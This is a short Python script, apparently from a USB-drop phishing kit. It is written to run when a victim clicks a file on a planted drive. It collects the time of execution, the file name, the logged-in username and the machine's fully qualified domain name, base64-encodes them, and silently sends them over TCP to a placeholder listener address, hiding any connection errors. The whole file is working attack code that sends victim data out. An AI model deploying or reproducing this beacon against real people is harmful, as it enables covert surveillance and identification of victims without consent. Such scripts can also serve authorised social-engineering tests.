#!/usr/bin/env python

"""
USB Information Call Back to be used with the matching Listener
This program will collect the following:
	- Time of Execution
	- Name of File Clicked
	- Username of the Logged in User
	- FQDN of the machine is ran on
Written by Randy Armknecht, May 2013
Updated by Victor Wieczorek, July 2015
Base64 is used due to limitations with py2e
"""

import sys
import socket
import base64
import getpass
from datetime import datetime

MV_STARTTIME = datetime.now()	# Time of Execution
MV_FILENAME = sys.argv[0]		# Get Name of File Clicked
MV_UNAME = getpass.getuser()	# Get Username
MV_FQDN = socket.getfqdn()		# Get Fully Qualified Domain Name

# Collected Data
MV_DATA = "%s!%s!%s!%s" % (str(MV_STARTTIME), MV_UNAME, MV_FQDN, MV_FILENAME)
MV_B64DATA = base64.b64encode(MV_DATA)[:-1]

# Set IP address and ensure the port matches that of the listener
HOST = '<IP ADDRESS>'
PORT = 5880
try:
    S = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    S.connect((HOST, PORT))
    S.sendall(MV_B64DATA)
    S.close()
except socket.error:
    pass
